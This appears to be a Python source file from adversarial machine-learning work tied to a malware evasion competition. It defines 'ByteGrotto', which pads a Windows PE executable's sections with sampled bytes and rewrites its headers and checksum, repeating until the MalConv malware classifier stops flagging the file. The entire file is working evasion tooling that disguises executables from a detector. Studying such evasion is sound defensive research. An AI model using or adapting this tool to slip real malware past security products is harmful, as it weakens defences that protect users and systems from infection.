import os
import copy
import glob
import torch
import random
import pefile
import warnings
import collections
import numpy as np
import torch.nn.functional as F

from MalConv import MalConv

warnings.filterwarnings("ignore")

# The MalConv Model/Class were taken from the repo
# https://github.com/endgameinc/malware_evasion_competition/blob/master/models.py
MALCONV_MODEL_PATH = 'models/malconv/malconv.checkpoint'
NONNEG_MODEL_PATH = 'models/nonneg/nonneg.checkpoint'

class MalConvModel(object):
    def __init__(self, model_path, thresh=0.5, name='malconv'): 
        self.model = MalConv(channels=256, window_size=512, embd_size=8).train()
        weights = torch.load(model_path,map_location='cpu')
        self.model.load_state_dict(weights['model_state_dict'])
        self.thresh = thresh
        self.__name__ = name

    def predict(self, bytez):
        _inp = torch.from_numpy( np.frombuffer(bytez,dtype=np.uint8)[np.newaxis,:] )
        with torch.no_grad():
            outputs = F.softmax( self.model(_inp), dim=-1)

        return outputs.detach().numpy()[0,1], outputs.detach().numpy()[0,1] > self.thresh

class ByteGrotto():
    def __init__(self, pe_path, pe_ouput_name, code_cave_size=512):
        self.pe = None
        self.pe_path = pe_path
        self.pe_ouput_name = pe_ouput_name
        self.code_cave_size = code_cave_size
        self.section_info = collections.OrderedDict()
        self.prev_section_info = None
        self.best_score = 1.0
        self.section_data_choices = []
        self.ba = None
        self.prev_ba = None
    
    def set_section_data(self):
        with open(self.pe_path, 'rb') as f:
            self.ba = bytearray(f.read())
            f.close()

        self.pe = pefile.PE(self.pe_path)
        for i in range(len(self.pe.sections)):
            self.section_info[self.pe.sections[i].Name.decode('utf-8')] = {
                "SizeOfRawData" : copy.deepcopy(self.pe.sections[i].SizeOfRawData),
                "PointerToRawData" : copy.deepcopy(self.pe.sections[i].PointerToRawData),
                "section_index" : i
            }

        self.pe.close()

    def set_section_choices(self):
        section_data_choices = glob.glob("data_sections/*")
        for i in range(len(section_data_choices)):
            file_size = os.path.getsize(section_data_choices[i])
            if file_size > self.pe.OPTIONAL_HEADER.SectionAlignment:
                self.section_data_choices.append(section_data_choices[i])

    def write(self):

        with open(self.pe_ouput_name, 'wb+') as f:
            f.write(self.ba)
            f.close()

        self.pe = pefile.PE(self.pe_ouput_name)
        for _, section_data in self.section_info.items():
            self.pe.sections[section_data['section_index']].PointerToRawData = section_data['PointerToRawData']
        
        try:
            self.pe.OPTIONAL_HEADER.CheckSum = self.pe.generate_checksum()
        except Exception as e:
            print("Error: unable to compute checksum - {}".format(e))

        self.pe.write(self.pe_ouput_name)
        self.pe.close()


    def manage_pe_state(self, score):
        if score > self.best_score:
            self.ba = copy.deepcopy(self.prev_ba)
            self.section_info = copy.deepcopy(self.prev_section_info)
        else:
            self.best_score = score

    def generate_adversarial_pe(self):
        epoch = 0

        self.set_section_data()
        self.set_section_choices()
        score, flagged = self.evaluate()

        while flagged:
            epoch += 1

            self.add_code_cave()
            score, flagged = self.evaluate()
            self.manage_pe_state(score)

            print("\rEpoch: {} Score: {} Best: {}".format(epoch, score, self.best_score), end='')

            # 2MB size limit
            if len(self.ba) > 2000000:
                print("Unable to find bypass")
                return

        self.write()
    
    def get_data(self, raw_data_size_delta):
        data_file = self.section_data_choices[random.randrange(len(self.section_data_choices))]
        try:
            with open(data_file, "rb") as f:
                data = f.read() 
        except IOError:
            print('Error: cannot open the file - {}'.format(data_file))

        # choose a random offset for the data sample
        offset = random.randrange(0, len(data) - raw_data_size_delta)

        return bytearray(data[offset:offset+raw_data_size_delta])

    def evaluate(self):
        malconv = MalConvModel(MALCONV_MODEL_PATH, thresh=0.5)
        return malconv.predict(self.ba)

    def align_new_section_size(self, current_section_size, section_alignment):
        return ((current_section_size + section_alignment) // section_alignment) * section_alignment if current_section_size % section_alignment else current_section_size

    def add_code_cave(self):
            self.prev_ba = copy.deepcopy(self.ba)
            self.prev_section_info = copy.deepcopy(self.section_info)
            last_section_end_offset = 0
            offsets = {}

            for section_name, section_info in self.section_info.items():
                new_section_size =  section_info['SizeOfRawData'] + self.code_cave_size
                new_size_of_raw_data = self.align_new_section_size(new_section_size, self.pe.OPTIONAL_HEADER.SectionAlignment)
                raw_data_size_delta = new_size_of_raw_data - section_info['SizeOfRawData']
                new_code_data = self.get_data(raw_data_size_delta)

                if section_info['section_index'] == 0:
                    offsets[self.section_info[section_name]['PointerToRawData'] + section_info['SizeOfRawData']] = new_code_data
                else:
                    offsets[last_section_end_offset + section_info['SizeOfRawData']] = new_code_data
                    self.section_info[section_name]['PointerToRawData'] = last_section_end_offset
                
                last_section_end_offset = self.section_info[section_name]['PointerToRawData']  + new_size_of_raw_data
                self.section_info[section_name]['SizeOfRawData'] = new_size_of_raw_data
            

            for offset, byte_data in offsets.items():
                self.ba[offset:offset] = byte_data
